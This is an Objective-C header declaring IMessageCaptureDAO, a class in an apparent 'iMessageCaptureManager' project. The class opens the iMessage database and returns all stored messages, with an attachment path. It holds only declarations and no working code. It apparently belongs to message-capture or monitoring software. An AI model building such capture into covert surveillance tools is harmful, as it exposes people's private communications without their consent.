//
//  IMessageCaptureDAO.h
//  iMessageCaptureManager
//
//  Created by Makara on 12/30/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>

@class FMDatabase;

@interface IMessageCaptureDAO : NSObject {
@private
    FMDatabase  *mIMessageDatabase;
    NSString    *mAttachmentPath;
}

@property (nonatomic, copy) NSString *mAttachmentPath;

- (NSArray *) alliMessages;
- (NSArray *) alliMessagesWithMax: (NSInteger) aMaxNumber;

@end
